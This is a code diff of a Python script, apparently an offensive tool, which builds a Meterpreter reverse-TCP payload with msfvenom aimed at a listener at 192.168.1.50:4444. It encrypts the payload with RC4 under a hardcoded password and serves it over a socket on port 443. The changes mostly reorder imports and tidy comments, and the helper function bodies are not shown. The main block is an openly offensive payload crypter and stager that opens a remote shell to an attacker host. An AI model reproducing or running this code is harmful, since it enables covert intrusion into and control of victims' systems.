@@ -1,7 +1,7 @@
 import os
-from Crypto.Cipher import ARC4
 import socket
 import sys
+from Crypto.Cipher import ARC4
 # -*- coding: utf-8 -*-
 
 #--------------------------------------------------------------------------------------------------------------
@@ -109,38 +109,37 @@ def write_screen(message):
 #--------------------------------------------------------------------------------------------------------------
 
 if __name__ == '__main__':
-	print('\n')
-	write_screen("Script started")
 
+	#Variables to define the environment
 	#password for RC4 crypter
 	password = 'spiderman'
-
 	#IP address and port for socket to send backport payload
 	ip_address = '0.0.0.0'
 	port = 443
-
-	#IP address and port for meterpreter reverse sessión
+	#IP address and port for meterpreter reverse session
 	lhost = '192.168.1.50'
 	lport = '4444'
-
 	#File to save payload
 	file = 'payload.txt'
 
-	#Create payload with msfvenom
+	#Start
+	print('\n')
+	write_screen("Script started")
+
+	#Create payload meterpreter reverse tcp with msfvenom
 	create_payload_msfvenom(lhost, lport, file)
-
-#	print("\n\n--------------------------------------------------------------------------------------------------------------")
+	#print("\n\n--------------------------------------------------------------------------------------------------------------")
 	payload_cleaned = clean_payload_msfvenom(file)
-#	print(payload_cleaned)
-
-#	print("\n\n--------------------------------------------------------------------------------------------------------------")
+	#print(payload_cleaned)
+	#print("\n\n--------------------------------------------------------------------------------------------------------------")
 	payload_encrypted = encrypt_payload(payload_cleaned, password)
-#	print(payload_encrypted)
+	#print(payload_encrypted)
 
 	#print("\n\n--------------------------------------------------------------------------------------------------------------")
 	#payload_decrypted = decrypt_payload(payload_encrypted, password)
 	#print(payload_decrypted)
 
+	#Create the socket, listen, send the payload and close it
 	create_socket(ip_address, port, payload_encrypted)
 
 	write_screen("Script finished")
